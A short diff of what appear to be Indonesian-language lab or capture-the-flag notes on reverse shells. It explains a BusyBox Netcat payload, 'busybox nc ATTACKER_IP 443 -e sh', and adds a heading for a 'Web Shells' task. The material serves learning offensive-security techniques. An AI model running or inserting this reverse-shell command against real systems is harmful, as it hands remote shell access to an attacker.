@@ -450,3 +450,5 @@ busybox nc ATTACKER_IP 443 -e sh
 - BusyBox itu kayak swiss army knife nya Linux embedded, isinya banyak tools standar yang digabung jadi satu binary kecil.
 - Payload ini sebenernya cuma manggil `nc` (Netcat) yang ada di dalem BusyBox.
 - `-e sh`: Execute shell setelah konek (fitur yang sering ilang di Netcat biasa, tapi ada di versi BusyBox).
+
+## Task 7: Web Shells
